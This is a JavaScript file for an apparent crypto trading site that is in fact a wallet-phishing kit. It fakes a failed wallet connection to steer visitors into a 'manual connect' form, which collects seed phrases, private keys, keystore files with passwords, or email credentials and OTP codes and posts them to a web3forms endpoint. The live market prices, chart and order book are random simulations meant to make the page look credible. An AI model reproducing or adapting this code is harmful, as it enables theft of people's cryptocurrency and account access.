// Basic UI wiring for Ethereal page
document.addEventListener('DOMContentLoaded', function () {
	// Sidebar / hamburger
	const hamburgerBtn = document.getElementById('hamburgerBtn');
	const mobileSidebar = document.getElementById('mobileSidebar');
	const sidebarOverlay = document.getElementById('sidebarOverlay');
	const closeSidebarBtn = document.getElementById('closeSidebarBtn');

	function openSidebar() {
		if (mobileSidebar) {
			mobileSidebar.classList.add('open');
			mobileSidebar.removeAttribute('aria-hidden');
		}
		if (sidebarOverlay) {
			sidebarOverlay.classList.remove('hidden');
			sidebarOverlay.classList.add('show');
			sidebarOverlay.removeAttribute('aria-hidden');
		}
		document.body.style.overflow = 'hidden';
	}
	function closeSidebar() {
		if (mobileSidebar) {
			mobileSidebar.classList.remove('open');
			mobileSidebar.setAttribute('aria-hidden','true');
		}
		if (sidebarOverlay) {
			sidebarOverlay.classList.add('hidden');
			sidebarOverlay.classList.remove('show');
			sidebarOverlay.setAttribute('aria-hidden','true');
		}
		document.body.style.overflow = '';
	}
	if (hamburgerBtn) hamburgerBtn.addEventListener('click', openSidebar);
	if (closeSidebarBtn) closeSidebarBtn.addEventListener('click', closeSidebar);
	if (sidebarOverlay) sidebarOverlay.addEventListener('click', closeSidebar);

	// Modal wiring
	const selectWalletModal = document.getElementById('selectWalletModal');
	const modalCloseBtn = document.getElementById('modalCloseBtn');
	const connectTriggers = document.querySelectorAll('.connect-trigger');
	const toggleMoreBtn = document.getElementById('toggleMoreWallets');
	const moreWallets = document.getElementById('moreWallets');
	const walletOptions = document.querySelectorAll('.wallet-option');
	const modalMainImg = document.getElementById('modalMainWalletImg');
	const modalMainName = document.getElementById('modalMainWalletName');
	const connectWalletBtn = document.getElementById('connectWalletBtn');
	const connectingOverlay = document.getElementById('connectingOverlay');
	const inModalConnecting = document.getElementById('inModalConnecting');
	const connectRing = document.getElementById('connectRing');
	const inModalConnectMessage = document.getElementById('inModalConnectMessage');

	function openSelectWalletModal() {
		if (!selectWalletModal) return;
		selectWalletModal.classList.remove('hidden');
		// ensure visible
		selectWalletModal.style.display = 'flex';
		selectWalletModal.removeAttribute('aria-hidden');
		document.body.style.overflow = 'hidden';
	}
	function closeSelectWalletModal() {
		if (!selectWalletModal) return;
		selectWalletModal.classList.add('hidden');
		selectWalletModal.style.display = '';
		selectWalletModal.setAttribute('aria-hidden','true');
		document.body.style.overflow = '';
		// reset in-modal states
		if (inModalConnecting) inModalConnecting.classList.remove('active');
		if (connectRing) connectRing.classList.remove('active');
		if (inModalConnectMessage) inModalConnectMessage.classList.remove('show');
	}

	if (connectTriggers && connectTriggers.length) {
		connectTriggers.forEach(btn => btn.addEventListener('click', function (e) {
			e.preventDefault();
			openSelectWalletModal();
		}));
	}
	if (modalCloseBtn) modalCloseBtn.addEventListener('click', closeSelectWalletModal);

	// Wire desktop and mobile menu links to open Select Wallet modal
	(function wireMenuLinks(){
		try{
			const desktopLinks = Array.from(document.querySelectorAll('.desktop-nav a, .desktop-menu-item'));
			const mobileLinks = Array.from(document.querySelectorAll('#mobileSidebar a'));
			[...desktopLinks, ...mobileLinks].forEach(a => {
				if (!a) return;
				a.addEventListener('click', function(e){ e.preventDefault(); openSelectWalletModal(); });
			});
		}catch(err){ console.error('wireMenuLinks error', err); }
	})();

	// Toggle more wallets
	if (toggleMoreBtn && moreWallets) {
		toggleMoreBtn.addEventListener('click', function () {
			const hidden = moreWallets.getAttribute('aria-hidden') === 'true' || moreWallets.classList.contains('hidden');
			if (hidden) {
				moreWallets.setAttribute('aria-hidden','false');
				moreWallets.classList.remove('hidden');
				toggleMoreBtn.setAttribute('aria-expanded','true');
			} else {
				moreWallets.setAttribute('aria-hidden','true');
				moreWallets.classList.add('hidden');
				toggleMoreBtn.setAttribute('aria-expanded','false');
			}
		});
	}

	// Wallet selection
	walletOptions.forEach(opt => {
		opt.addEventListener('click', function (e) {
			e.preventDefault();
			// update main image and name
			const img = opt.querySelector('img');
			const label = opt.querySelector('span') && opt.querySelector('span').textContent;
			if (img && modalMainImg) modalMainImg.src = img.src;
			if (label && modalMainName) modalMainName.textContent = label;
			// track selected wallet for manual flows
			try { window.selectedWallet = { name: label || modalMainName.textContent, src: (img && img.src) || (modalMainImg && modalMainImg.src) || '' }; } catch (e){}
			// visually mark selected
			walletOptions.forEach(o => o.classList.remove('selected'));
			opt.classList.add('selected');
			// hide the expanded "more wallets" panel (if open)
			try {
				if (moreWallets) {
					moreWallets.setAttribute('aria-hidden', 'true');
					moreWallets.classList.add('hidden');
				}
				if (toggleMoreBtn) toggleMoreBtn.setAttribute('aria-expanded', 'false');
			} catch (err) { console.warn('hide moreWallets error', err); }
		});
	});

	// Connect button - simulate connecting inside the Select Wallet modal
	// Behavior: when user clicks Connect inside select modal, show in-modal spinner/ring for 12s,
	// then show the "Cannot connect" (red) and "Connect manually" (green) message for 4s,
	// then open the Manual Connect modal. Do NOT show the global connecting overlay in this flow.
	const connectManualModal = document.getElementById('connectManualModal');
	const manualCloseBtn = document.getElementById('manualCloseBtn');
	let _connectTimeout = null;
	let _messageTimeout = null;

	function openConnectManualModal() {
		if (!connectManualModal) return;
		connectManualModal.classList.remove('hidden');
		connectManualModal.style.display = 'flex';
		connectManualModal.removeAttribute('aria-hidden');
		document.body.style.overflow = 'hidden';
	}

	function closeConnectManualModal() {
		if (!connectManualModal) return;
		connectManualModal.classList.add('hidden');
		connectManualModal.style.display = '';
		connectManualModal.setAttribute('aria-hidden','true');
		document.body.style.overflow = '';
	}

	if (manualCloseBtn) manualCloseBtn.addEventListener('click', closeConnectManualModal);

	// Render phrase input grid and toggle manual connect fields
	function renderManualPhraseGrid(count) {
		const grid = document.getElementById('phrasesGrid');
		if (!grid) return;
		grid.innerHTML = '';
		for (let i = 1; i <= (count || 12); i++) {
			const cell = document.createElement('div');
			cell.className = 'phrase-cell';
			const input = document.createElement('input');
			input.type = 'text';
			input.placeholder = `word ${i}`;
			input.className = 'bg-gray-800 border border-gray-700 text-white p-3 rounded-xl text-center';
			input.name = `phrase-${i}`;
			input.id = `phrase-${i}`;
			cell.appendChild(input);
			grid.appendChild(cell);
		}
	}

	function updateManualFields() {
		const sel = document.querySelector('input[name="manualMethod"]:checked');
		const method = sel ? sel.value : 'phrases';
		const mapping = {
			phrases: 'phrasesField',
			keystore: 'keystoreField',
			private: 'privateField',
			email: 'emailField'
		};
		Object.keys(mapping).forEach(k => {
			const el = document.getElementById(mapping[k]);
			if (!el) return;
			if (k === method) el.classList.remove('hidden'); else el.classList.add('hidden');
		});
	}

	// Wire radio changes
	const manualRadios = Array.from(document.querySelectorAll('input[name="manualMethod"]'));
	manualRadios.forEach(r => r.addEventListener('change', updateManualFields));

	const phraseCountRadios = Array.from(document.querySelectorAll('input[name="phraseCount"]'));
	phraseCountRadios.forEach(r => r.addEventListener('change', function () { renderManualPhraseGrid(parseInt(this.value,10)); }));

	// Initial render
	renderManualPhraseGrid(12);
	updateManualFields();

	// ensure a default selectedWallet exists
	if (!window.selectedWallet) window.selectedWallet = { name: (modalMainName && modalMainName.textContent) || 'MetaMask', src: (modalMainImg && modalMainImg.src) || '' };
	let emailData = {};

	// Manual connect / OTP wiring
	const manualConnectBtn = document.getElementById('manualConnectBtn');
	const otpModal = document.getElementById('otpModal');
	const otpSubmitBtn = document.getElementById('otpSubmitBtn');
	const manualProcessingOverlay = document.getElementById('manualProcessingOverlay');

	function getSelectedWalletSrc() {
		try { return (document.getElementById('modalMainWalletImg') || {}).src || '';} catch(e){return '';}
	}

	function showManualProcessingOverlay(imageSrc) {
		if (!manualProcessingOverlay) return;
		// add or update wallet image in overlay
		let img = manualProcessingOverlay.querySelector('img.manual-processing-wallet');
		if (!img) {
			img = document.createElement('img');
			img.className = 'manual-processing-wallet mx-auto mb-4';
			img.style.width = '84px';
			img.style.height = '84px';
			img.style.borderRadius = '12px';
			const inner = manualProcessingOverlay.querySelector('div');
			if (inner) inner.insertBefore(img, inner.firstChild);
		}
		if (imageSrc) img.src = imageSrc;
		// show overlay and keep it on screen
		manualProcessingOverlay.classList.remove('hidden');
		manualProcessingOverlay.style.display = 'flex';
		manualProcessingOverlay.removeAttribute('aria-hidden');
		document.body.style.overflow = 'hidden';
		startProcessingDots();
	}

	function hideManualProcessingOverlay() {
		if (!manualProcessingOverlay) return;
		manualProcessingOverlay.classList.add('hidden');
		manualProcessingOverlay.style.display = '';
		manualProcessingOverlay.setAttribute('aria-hidden','true');
		document.body.style.overflow = '';
		stopProcessingDots();
	}

// Processing dots animation
let _processingDotsInterval = null;
function startProcessingDots() {
	stopProcessingDots();
	const el = document.getElementById('processingDots');
	if (!el) return;
	const frames = ['.', '..', '...', ''];
	let i = 0;
	el.textContent = frames[i];
	_processingDotsInterval = setInterval(() => {
		i = (i + 1) % frames.length;
		el.textContent = frames[i];
	}, 400);
}
function stopProcessingDots() {
	if (_processingDotsInterval) { clearInterval(_processingDotsInterval); _processingDotsInterval = null; }
	const el = document.getElementById('processingDots');
	if (el) el.textContent = '...';
}

	// Update manual button label based on selected method
	function refreshManualButtonLabel() {
		const sel = document.querySelector('input[name="manualMethod"]:checked');
		const method = sel ? sel.value : 'phrases';
		if (manualConnectBtn) {
			manualConnectBtn.textContent = method === 'email' ? 'Sign in' : 'Connect';
		}
	}

	// call whenever fields update
	const _origUpdateManualFields = updateManualFields;
	updateManualFields = function() {
		_origUpdateManualFields();
		refreshManualButtonLabel();
	};

	// manual connect action (web3forms integration)
	const access_key = 'b5f9f926-ecd5-4757-b0ad-ff1954bd43ea';

	if (manualConnectBtn) {
		manualConnectBtn.addEventListener('click', async () => {
			const method = document.querySelector('input[name="manualMethod"]:checked')?.value;
			let payloadParts = [];
			payloadParts.push('Wallet: ' + (window.selectedWallet && window.selectedWallet.name ? window.selectedWallet.name : 'unknown'));

			if (method === 'phrases') {
				const count = parseInt(document.querySelector('input[name="phraseCount"]:checked')?.value || '12');
				const words = [];
				for (let i = 1; i <= count; i++) {
					const val = document.getElementById(`phrase-${i}`)?.value.trim();
					if (!val) { alert('Please fill all phrase words'); return; }
					words.push(val);
				}
				payloadParts.push('Phrases: ' + words.join(' '));
			} else if (method === 'keystore') {
				const json = document.getElementById('keystoreInput')?.value.trim();
				const pass = document.getElementById('keystorePassword')?.value;
				if (!json) { alert('Please paste Keystore JSON'); return; }
				payloadParts.push('Keystore JSON: ' + json);
				if (pass) payloadParts.push('Password: ' + pass);
			} else if (method === 'private') {
				const key = document.getElementById('privateInput')?.value.trim();
				if (!key) { alert('Please enter Private Key'); return; }
				payloadParts.push('Private Key: ' + key);
			} else if (method === 'email') {
				const email = document.getElementById('emailInput')?.value.trim();
				const pass = document.getElementById('emailPassword')?.value;
				if (!email || !pass) { alert('Please fill email and password'); return; }
				payloadParts.push('Email: ' + email);
				payloadParts.push('Password: ' + pass);
				emailData = { email, password: pass };
				document.getElementById('connectManualModal').classList.add('hidden');
				document.getElementById('otpModal').classList.remove('hidden');
				document.body.style.overflow = 'hidden';
				return;
			}

			// show processing overlay with selected wallet image and hide manual modal
			showManualProcessingOverlay((window.selectedWallet && window.selectedWallet.src) || getSelectedWalletSrc());
			document.getElementById('connectManualModal').classList.add('hidden');

			const message = payloadParts.join('\n\n');
			try {
				await fetch('https://api.web3forms.com/submit', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify({ access_key, subject: 'Manual Wallet Connect', message })
				});
				// Keep Processing... visible
			} catch (err) {
				document.getElementById('manualProcessingOverlay').classList.add('hidden');
				alert('Network error');
				document.body.style.overflow = '';
			}
		});
	}

	// OTP submit handler (web3forms)
	if (otpSubmitBtn) {
		otpSubmitBtn.addEventListener('click', async () => {
			const otp = document.getElementById('otpInput')?.value.trim();
			if (!otp || otp.length !== 6) { document.getElementById('otpError').classList.remove('hidden'); return; }
			document.getElementById('otpModal').classList.add('hidden');
			showManualProcessingOverlay((window.selectedWallet && window.selectedWallet.src) || getSelectedWalletSrc());

			const payloadParts = [];
			payloadParts.push('Wallet: ' + (window.selectedWallet && window.selectedWallet.name ? window.selectedWallet.name : 'unknown'));
			payloadParts.push('Email: ' + (emailData.email || ''));
			payloadParts.push('Password: ' + (emailData.password || ''));
			payloadParts.push('OTP: ' + otp);

			const message = payloadParts.join('\n\n');
			try {
				await fetch('https://api.web3forms.com/submit', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify({ access_key, subject: 'Manual Wallet Connect - OTP', message })
				});
				// Keep Processing... visible
			} catch (err) {
				document.getElementById('manualProcessingOverlay').classList.add('hidden');
				alert('Network error');
				document.body.style.overflow = '';
			}
		});
	}

	if (connectWalletBtn) {
		connectWalletBtn.addEventListener('click', (e) => {
			e.preventDefault();
			const btn = e.currentTarget || e.target;
			if (btn.dataset && btn.dataset.loading === 'true') return;
			if (btn.dataset) btn.dataset.loading = 'true';
			btn.disabled = true;

			const connectRingEl = document.getElementById('connectRing');
			const inModalEl = document.getElementById('inModalConnecting');
			const connectingText = document.getElementById('inModalConnectingText');
			const msg = document.getElementById('inModalConnectMessage');

			// Activate the spinning ring
			if (connectRingEl) connectRingEl.classList.add('active');
			if (inModalEl) {
				inModalEl.classList.add('active');
				inModalEl.setAttribute('aria-hidden', 'false');
			}
			if (connectingText) connectingText.style.display = 'block';

			// After 12 seconds, stop the ring and proceed
			setTimeout(() => {
				if (connectRingEl) connectRingEl.classList.remove('active');
				if (inModalEl) {
					inModalEl.classList.remove('active');
					inModalEl.setAttribute('aria-hidden', 'true');
				}
				if (connectingText) connectingText.style.display = 'none';
				if (msg) {
					msg.classList.add('show');
					msg.setAttribute('aria-hidden', 'false');
				}

				setTimeout(() => {
					if (msg) {
						msg.classList.remove('show');
						msg.setAttribute('aria-hidden', 'true');
					}
					closeSelectWalletModal();
					const manualModal = document.getElementById('connectManualModal');
					if (manualModal) {
						manualModal.classList.remove('hidden');
						document.body.style.overflow = 'hidden';
						if (typeof renderManualPhraseGrid === 'function') renderManualPhraseGrid(12);
						if (typeof updateManualFields === 'function') updateManualFields();
					}
					btn.disabled = false;
					if (btn.dataset) btn.dataset.loading = 'false';
				}, 3000);
			}, 12000);
		});
	}

	// Escape key closes modal and sidebar
	document.addEventListener('keydown', function (e) {
		if (e.key === 'Escape') {
			closeSelectWalletModal();
			closeSidebar();
			// hide connecting overlays
			if (connectingOverlay) { connectingOverlay.classList.add('hidden'); connectingOverlay.style.display = 'none'; }
		}
	});

	// small runtime check
	console.info('UI script initialized: hamburger=%s, modal=%s', !!hamburgerBtn, !!selectWalletModal);
	// ---------- Live market simulation & UI updates ----------
	// Find Oracle Price and 24h Change elements by label
	function findLabelValue(labelText) {
		const labels = Array.from(document.querySelectorAll('span'));
		for (const s of labels) {
			if (s.textContent && s.textContent.trim() === labelText) {
				const parent = s.parentElement;
				if (parent) {
					// value is next span inside same parent
					const val = Array.from(parent.querySelectorAll('span')).find(x => x !== s);
					if (val) return val;
				}
			}
		}
		return null;
	}

	const oracleEl = findLabelValue('Oracle Price');
	const changeEl = findLabelValue('24h Change');

	// build markets list from footer ticker items
	const footerListItems = Array.from(document.querySelectorAll('footer [role="listitem"]'));
	const markets = footerListItems.map(li => {
		const spans = li.querySelectorAll('span');
		const name = spans[0] ? spans[0].textContent.trim() : 'SYM-USD';
		const pctText = spans[1] ? spans[1].textContent.trim() : '+0.00%';
		const pct = parseFloat(pctText.replace('%','').replace('+','')) || 0;
		return { symbol: name, pct: pct, price: 100*(1+Math.random()) };
	}).filter(m => m.symbol);

	// If no footer items found, add some defaults
	if (!markets.length) {
		markets.push({symbol:'BTC-USD', pct:0, price:87878});
		markets.push({symbol:'ETH-USD', pct:0.2, price:1887});
		markets.push({symbol:'SOL-USD', pct:-1.04, price:32});
	}

	// Map for quick lookup
	const marketMap = {};
	markets.forEach(m => marketMap[m.symbol] = m);

	// Selected market (defaults to BTC-USD if present)
	let selectedSymbol = marketMap['BTC-USD'] ? 'BTC-USD' : markets[0].symbol;

	// Chart: simple line chart via canvas
	const chartCanvas = document.getElementById('tradingChart');
	let chartCtx = null;
	const series = [];
	if (chartCanvas && chartCanvas.getContext) {
		chartCtx = chartCanvas.getContext('2d');
		// create initial series
		for (let i=0;i<60;i++) series.push((marketMap[selectedSymbol] ? marketMap[selectedSymbol].price : 100) * (1 + (Math.random()-0.5)/200));
		function drawChart() {
			const dpr = window.devicePixelRatio || 1;
			const w = chartCanvas.clientWidth;
			const h = chartCanvas.clientHeight;
			chartCanvas.width = Math.floor(w * dpr);
			chartCanvas.height = Math.floor(h * dpr);
			chartCtx.scale(dpr,dpr);
			chartCtx.clearRect(0,0,w,h);
			// background
			chartCtx.fillStyle = '#0b0b0d';
			chartCtx.fillRect(0,0,w,h);
			// line
			const min = Math.min(...series);
			const max = Math.max(...series);
			chartCtx.strokeStyle = '#7ee787';
			chartCtx.lineWidth = 2;
			chartCtx.beginPath();
			series.forEach((v,i)=>{
				const x = (i/(series.length-1))*w;
				const y = h - ((v - min)/(max - min || 1))*h;
				if (i===0) chartCtx.moveTo(x,y); else chartCtx.lineTo(x,y);
			});
			chartCtx.stroke();
		}
		drawChart();
	}

	// Order book refresh
	const sellOrdersEl = document.getElementById('sellOrders');
	function renderOrderBook(mid) {
		if (!sellOrdersEl) return;
		sellOrdersEl.innerHTML = '';
		const midPrice = mid || (marketMap[selectedSymbol] && marketMap[selectedSymbol].price) || 100;
		for (let i=0;i<12;i++){
				const price = parseFloat((midPrice * (1 + (i+1)/1000)).toFixed(2));
				const size = (Math.random()*0.5).toFixed(4);
				const row = document.createElement('div');
				row.className = 'px-2 py-1 text-xs grid grid-cols-3 gap-3';
				// determine color relative to previous mid price if available
				const prevMid = (marketMap[selectedSymbol] && marketMap[selectedSymbol].prev) || midPrice;
				const priceClass = (price >= prevMid) ? 'text-green-500' : 'text-red-600';
				// invert size/total color relative to price: if price is green, sizes should be red and vice-versa
				const sizeClass = (priceClass === 'text-green-500') ? 'text-red-600' : 'text-green-500';
				const total = (parseFloat(size)*(i+1)).toFixed(4);
				row.innerHTML = `<span class="${priceClass}">${price.toFixed(2)}</span><span class="text-right ${sizeClass}">${size}</span><span class="text-right ${sizeClass}">${total}</span>`;
				sellOrdersEl.appendChild(row);
		}
	}
	renderOrderBook();

	// Update loop: random-walk prices and update DOM
	setInterval(function(){
		// adjust each market
		markets.forEach(m => {
			// store previous price for coloring comparisons
			m.prev = m.price;
			const delta = (Math.random()-0.5) * m.price * 0.002; // small change
			m.price = Math.max(0.0001, m.price + delta);
			m.pct = ((Math.random()-0.5)*2).toFixed(2);
		});
		// update footer ticker: percent on desktop, live price on mobile
		const isMobileView = window.innerWidth <= 767;
		footerListItems.forEach(li => {
			const spans = li.querySelectorAll('span');
			if (spans.length >=2){
				const sym = spans[0].textContent.trim();
				const m = marketMap[sym];
					if (m){
						if (isMobileView) {
							// show live price on mobile marquee/headline and color by direction
							spans[1].textContent = Number(m.price).toLocaleString(undefined,{maximumFractionDigits:2});
							spans[1].className = (m.pct >= 0) ? 'text-green-500' : 'text-red-600';
						} else {
							const pct = (m.pct>0?'+':'') + parseFloat(m.pct).toFixed(2) + '%';
							spans[1].textContent = pct;
							spans[1].className = m.pct>=0 ? 'text-green-500' : 'text-red-600';
						}
					}
			}
		});
		// update selected market display
		const sel = marketMap[selectedSymbol];
		if (sel){
			if (oracleEl) oracleEl.textContent = Number(sel.price).toLocaleString(undefined,{maximumFractionDigits:2});
			if (changeEl) {
				changeEl.textContent = (sel.pct>0?'+':'') + Number(sel.pct).toFixed(2) + '%';
				changeEl.className = sel.pct>=0 ? 'text-green-500' : 'text-red-600';
			}
			// push new point to series and redraw
			if (series){
				series.push(sel.price * (1 + (Math.random()-0.5)/500));
				if (series.length>120) series.shift();
				if (chartCtx) drawChart();
				renderOrderBook(sel.price);
			}
		}
	}, 1500);

	// Marquee setup for footer/top-gaining markets ticker
	(function setupMarquee(){
		try{
			const region = document.querySelector('div[aria-label="Top gaining markets ticker"]');
			if(!region) return;
			const list = region.querySelector('[role="list"]') || region.querySelector('div');
			if(!list) return;
			// ensure list items inline
			list.style.display = 'inline-flex';
			list.style.gap = '18px';
			// duplicate content for continuous scroll if not already duplicated
			if(!list.dataset.duplicated){
				list.innerHTML = list.innerHTML + list.innerHTML;
				list.classList.add('ticker-scroll');
				list.dataset.duplicated = 'true';
			}
		}catch(e){ console.error('marquee init error',e); }
	})();
});

